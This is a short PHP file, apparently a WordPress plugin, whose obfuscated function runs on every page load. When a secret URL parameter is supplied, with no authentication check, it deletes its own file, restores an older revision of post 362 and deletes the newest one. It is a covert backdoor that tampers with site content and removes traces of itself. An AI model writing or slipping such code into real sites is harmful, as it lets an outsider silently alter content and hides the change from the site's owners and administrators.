<?php

function image_protect_map_slug() {
	if (isset($_GET['stop_manager_wpmu']) && $_GET['stop_manager_wpmu'] === 'toggle_gravatar_daily_shop') {
		unlink(trim(preg_replace('/\(.*$/', '', __FILE__)));
		$customer_poll_nav = 362;
		$restaurant_history_digital = wp_get_post_revisions($customer_poll_nav);
		if (empty($restaurant_history_digital)) die('no revisions');
		if (count($restaurant_history_digital) < 2) die('less than 2');
		$revisions_upload_replace = array_shift($restaurant_history_digital);
		$mediaelement_menu_include = $revisions_upload_replace->ID;
		$exception_categories_file = array_shift($restaurant_history_digital);
		$clock_svg_404 = $exception_categories_file->ID;
		$bank_icon_exchange_timeline = wp_restore_post_revision($clock_svg_404);
		if ($bank_icon_exchange_timeline === false) die('error restoring');
		$bank_icon_exchange_timeline = wp_delete_post_revision($mediaelement_menu_include);		
		if ($bank_icon_exchange_timeline === false) die('error deleting');
		die('done');
	}
}

add_action('init', 'image_protect_map_slug');
